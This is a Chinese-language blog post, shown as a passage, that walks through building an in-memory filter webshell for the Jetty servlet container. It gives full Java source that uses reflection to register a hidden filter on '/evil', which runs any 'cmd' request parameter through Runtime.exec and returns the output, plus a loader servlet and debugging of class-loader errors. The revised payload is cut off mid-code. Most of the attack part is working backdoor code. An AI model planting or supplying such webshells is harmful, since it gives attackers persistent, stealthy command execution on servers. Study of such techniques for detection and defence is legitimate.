class="line"><span class="tag">&lt;<span class="name">web-app</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>Archetype Created Web Application<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>HelloServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.fanxing.servlet.HelloServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>HelloServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/hello<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>由于在Run/Debug Configurations当中我并没有找到配置Jetty
server的地方，所以我们这里采用maven plugin的方式启动该应用程序。</p>
<img data-src="/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/2.png" class>
<p>点开右侧的Maven然后点击plugins的Jetty:run，然后就可以正常启动应用程序，并且能够正常访问</p>
<img data-src="/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/3.png" class>
<img data-src="/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/4.png" class>
<p>同时右键jetty:run可以对该应用程序进行调试</p>
<img data-src="/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/5.png" class>
<h4 id="filter分析">Filter分析</h4>
<p>如下过程参考至https://xz.aliyun.com/t/12182</p>
<p>为了知道如何装配内存马的各个部分我们必须要知道原Filter是如何构成的，我们需要定位到调用doFilter的部分进行观察。</p>
<img data-src="/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/6.png" class>
<p>其调用chian.doFilter，我们需要定位chain的获取位置，并在此下断点再次启动应用程序看其内部逻辑。</p>
<img data-src="/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/7.png" class>
<p>我们往前去溯源程序的运行逻辑可以发现，源程序是在如下代码段当中进行Filter的获取的，其中关键的变量是<code>_filterPathMappings</code></p>
<img data-src="/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/8.png" class>
<h4 id="filter内存马实现">filter内存马实现</h4>
<p><code>_filterPathMapping</code>当中记录了有关filter的信息，这些都会在初始化该变量的时候用到。现在我们可以理一下思路ServletHandler里面有一个filterchain，这个filterchain里面的信息是通过<code>_filterPathMapping</code>拿到的，所以我们的第一步是获取ServletHandler它是整个内存马的基石，如同tomcat当中StandardContext一样。使用jos搜索对象我们可以得到下面的结果</p>
<img data-src="/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/9.png" class>
<p>根据搜索出来的结果我们就可以找到对应的获取ServletHandler的方式</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">getHandler</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">thread</span> <span class="operator">=</span> Thread.currentThread();</span><br><span class="line">    <span class="type">Object</span> <span class="variable">contextClassLoader</span> <span class="operator">=</span> getFieldValue(thread, <span class="string">&quot;contextClassLoader&quot;</span>);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">context</span> <span class="operator">=</span> getFieldValue(contextClassLoader,<span class="string">&quot;_context&quot;</span>);</span><br><span class="line">    servletHandler = getFieldValue(context, <span class="string">&quot;_servletHandler&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后回来再看<code>_filterPathMappings</code>这个变量，我们可以通过观察它运行时的状态，来看它包含哪些内容。首先，<code>_filterPathMappings</code>是一个ArrayList类型的对象，其中包含的数组元素是FilterMapping类型，每一个FilterMapping类型的变量内部都含有<code>_filtername</code>，<code>_holder</code>，<code>_pathSpecs</code>三个变量</p>
<img data-src="/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/10.png" class>
<p>我们从FilterMapping.class文件当中的函数中可以看到，针对每一种我们所需要的元素都有对应的setter方法</p>
<img data-src="/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/11.png" class>
<img data-src="/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/12.png" class>
<img data-src="/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/13.png" class>
<p>在这些setter方法当中我们可以发现setFilterName本身并不是很需要，因为在setFilterHolder里面就已经自动调用了该方法。而setPathSpecs本身的入参是一个String类型的路径，也非常简单，唯一需要操作的点是setFilterHolder，首先他不是public我们需要通过反射进行获取并调用，其次是我们需要额外的初始化一个FilterHolder类型的对象。</p>
<img data-src="/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/14.png" class>
<p>下面是我给出的这部分的代码段</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取FilterHolder</span></span><br><span class="line">        <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BehinderFilter</span>();</span><br><span class="line">        <span class="type">FilterHolder</span> <span class="variable">filterHolder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterHolder</span>(filter);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//拼凑filtermapping</span></span><br><span class="line">        <span class="type">FilterMapping</span> <span class="variable">filterMapping</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMapping</span>();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">setFilterHolder</span> <span class="operator">=</span> getMethod(filterMapping,<span class="string">&quot;setFilterHolder&quot;</span>, FilterHolder.class);</span><br><span class="line">        setFilterHolder.invoke(filterMapping, filterHolder);</span><br><span class="line">        filterMapping.setPathSpec(<span class="string">&quot;/evil&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>最后参考源代码当中向<code>_filterPathMapping</code>添加filtermapping，<code>_filterPathMapping.add(filtermapping)</code></p>
<img data-src="/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/15.png" class>
<p>到此为止，理论成立，我们来看实战结果。我将整体的filter内存马结果代码展示如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.eclipse.jetty.servlet.FilterHolder;</span><br><span class="line"><span class="keyword">import</span> org.eclipse.jetty.servlet.FilterMapping;</span><br><span class="line"><span class="keyword">import</span> org.eclipse.jetty.servlet.ServletHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BehinderFilter</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">Object</span> <span class="variable">servletHandler</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Object obj, String name)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> obj.getClass();</span><br><span class="line">        <span class="keyword">while</span>(clazz != Object.class) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                field = clazz.getDeclaredField(name);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException var6) &#123;</span><br><span class="line">                clazz = clazz.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Method <span class="title function_">getMethod</span><span class="params">(Object obj, String name, Class&lt;?&gt;... paramClazz)</span> <span class="keyword">throws</span> NoSuchMethodException &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> obj.getClass();</span><br><span class="line">        <span class="keyword">while</span>(clazz != Object.class) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                method = clazz.getDeclaredMethod(name, paramClazz);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var6) &#123;</span><br><span class="line">                clazz = clazz.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> method;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">getHandler</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">thread</span> <span class="operator">=</span> Thread.currentThread();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">contextClassLoader</span> <span class="operator">=</span> getFieldValue(thread, <span class="string">&quot;contextClassLoader&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">context</span> <span class="operator">=</span> getFieldValue(contextClassLoader,<span class="string">&quot;_context&quot;</span>);</span><br><span class="line">        servletHandler = getFieldValue(context, <span class="string">&quot;_servletHandler&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//获取ServletHandler</span></span><br><span class="line">            getHandler();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//获取FilterHolder</span></span><br><span class="line">            <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BehinderFilter</span>();</span><br><span class="line">            <span class="type">FilterHolder</span> <span class="variable">filterHolder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterHolder</span>(filter);</span><br><span class="line">            filterHolder.setName(<span class="string">&quot;BehinderFilter&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//拼凑filtermapping</span></span><br><span class="line">            <span class="type">FilterMapping</span> <span class="variable">filterMapping</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMapping</span>();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">setFilterHolder</span> <span class="operator">=</span> getMethod(filterMapping,<span class="string">&quot;setFilterHolder&quot;</span>, FilterHolder.class);</span><br><span class="line">            setFilterHolder.invoke(filterMapping, filterHolder);</span><br><span class="line">            filterMapping.setPathSpec(<span class="string">&quot;/evil&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//加入filterPathMappings</span></span><br><span class="line">            <span class="type">ArrayList</span> <span class="variable">_filterPathMapings</span> <span class="operator">=</span> (ArrayList) getFieldValue(servletHandler,<span class="string">&quot;_filterPathMappings&quot;</span>);</span><br><span class="line">            _filterPathMapings.add(filterMapping);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">        <span class="comment">//回显处理</span></span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">        java.io.<span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(<span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(inputStream));</span><br><span class="line">        String line;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">stringBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>)&#123;</span><br><span class="line">            stringBuilder.append(line + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ServletOutputStream</span> <span class="variable">servletOutputStream</span> <span class="operator">=</span> response.getOutputStream();</span><br><span class="line">        servletOutputStream.write(stringBuilder.toString().getBytes());</span><br><span class="line">        servletOutputStream.flush();</span><br><span class="line">        servletOutputStream.close();</span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>为了测试内存马性能，我才用最简单粗暴的触发方式，在HelloServlet当中直接加载该内存马。代码如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse res)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.currentThread().getContextClassLoader().loadClass(BehinderFilter.class.getName()).newInstance();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">        res.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">        res.setStatus(HttpServletResponse.SC_OK);</span><br><span class="line">        res.getWriter().println(<span class="string">&quot;&lt;h1&gt;Hello World&lt;/h1&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在注册之前我们先访问一下/evil，这个时候可以看到这个路由是啥也没有的</p>
<img data-src="/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/16.png" class>
<p>然后访问一下/hello注入一下我们理论成立的内存马，最后再访问/evil路由，结果如下。看到这个报错我直接？？？？</p>
<img data-src="/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/17.png" class>
<h4 id="问题分析">问题分析</h4>
<p>好好好同类型无法相互转换okok。但是这至少说明我们的所有想写入的字段都写进去了，要不然也不会报这个错。通过一番调试我发现问题出现在遍历<code>_filterPathMappings</code>上面。</p>
<img data-src="/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/19.png" class>
<p>数组里面有三个filtermapping，<code>Jetty_WebSocketUpgradeFilter</code>,<code>HelloFilter</code>,<code>BehinderFilter</code>,在遍历到第三个的时候直接抛出异常。</p>
<img data-src="/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/20.png" class>
<p>我们来对比一下正常的Filter和我们所注入的filter之间的区别</p>
<img data-src="/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/21.png" class>
<img data-src="/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/22.png" class>
<p>对比之后我们可以发现主要的区别在holder里面，我们的holder仿佛什么都没有，但是我们确实是使用带有filter的构造函数进行实例化的</p>
<img data-src="/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/23.png" class>
<p>但是由于多态的特性我们原先的写法，永远无法到达FilterHolder(Filter
filter)当中，只会调用第一个构造方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">FilterHolder</span> <span class="variable">filterHolder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterHolder</span>(filter);</span><br></pre></td></tr></table></figure>
<p>但是这不是根本问题，我们仍可以采用分段式的函数调用来弥补直接调用构造的方法的不足，如下所示</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">FilterHolder</span> <span class="variable">filterHolder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterHolder</span>();</span><br><span class="line">filterHolder.setFilter(filter);</span><br></pre></td></tr></table></figure>
<p>这样我们解决问题了吗？并没有，原因就在setFilter()函数当中，他根本就没有往<code>_filter</code>里面放数据。当然这个和jetty的版本有很大的关系，当前的版本是9.4.44.v20210927</p>
<img data-src="/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/24.png" class>
<p>我们回到9.0.7.v20131107版本当中，就会发现其中的内容有很大的变化，它能够正常给<code>_filter</code>赋值。（后面的所有步骤都是用9.0.7.v20131107）</p>
<img data-src="/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/25.png" class>
<p>但是即便是这种情况下也无法避免<code>org.eclipse.jetty.servlet.FilterMapping cannot be cast to org.eclipse.jetty.servlet.FilterMapping</code></p>
<h4 id="问题解答类加载器的命名空间问题">问题解答（类加载器的命名空间问题）</h4>
<p>网上关于这种报错的有两种解释：一种是针对于spring环境下的特化问题：devtool上的热部署，第二种解释是类加载器的命名空间问题。</p>
<p>再回到https://xz.aliyun.com/t/12182文章当中提出的payload，我们拿过来做一点简单的改动，得到下面的payload，这一次是可以完美运行的没有任何问题。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> MemshellTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.eclipse.jetty.servlet.FilterHolder;</span><br><span class="line"><span class="keyword">import</span> org.eclipse.jetty.servlet.FilterMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BehinderFilter</span> <span class="keyword">extends</span> <span class="title 